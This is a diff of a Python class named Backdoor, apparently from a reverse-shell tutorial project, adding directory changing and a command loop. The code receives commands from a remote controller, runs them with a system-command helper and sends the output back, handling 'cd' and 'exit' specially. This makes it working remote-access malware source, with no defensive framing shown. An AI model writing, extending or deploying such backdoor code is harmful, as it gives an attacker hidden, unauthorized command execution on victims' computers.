@@ -1,6 +1,7 @@
 
 import socket, subprocess
 import json
+import os
 
 class Backdoor:
     def __init__(self, ip, port):
@@ -27,15 +28,22 @@ class Backdoor:
     def close_connection(self):
         self.connection.close()
 
+    def change_working_directory_to(self, path):
+        os.chdir(path)
+        return "[+] Changing working directory to " + path
+
     def run(self):
         while True:
             try:
-                #received_command = self.connection.recv(1024)
                 received_command = self.reliable_receive()
-                #print(received_command)
-                command_result = self.execute_system_command(received_command).decode()
-                #print(command_result)
-                #self.connection.send(command_result)
+
+                if received_command[0] == "exit":
+                    self.connection.close()
+                    exit()
+                elif received_command[0] == "cd" and len(received_command) > 1:
+                    command_result = self.change_working_directory_to(received_command[1])
+                else:
+                    command_result = self.execute_system_command(received_command).decode()
                 self.reliable_send(command_result)
 
             except ConnectionResetError:
